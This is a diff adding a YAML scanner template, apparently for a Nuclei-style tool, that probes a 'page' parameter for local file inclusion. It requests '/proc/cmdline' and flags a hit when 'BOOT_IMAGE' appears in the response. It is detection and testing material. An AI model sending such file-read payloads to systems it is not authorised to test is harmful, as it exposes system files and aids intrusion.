@@ -1,0 +1,20 @@
+id: lfi4-33
+name: 'System file /proc/cmdline via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /proc/cmdline via page'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '/proc/cmdline'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'BOOT_IMAGE'
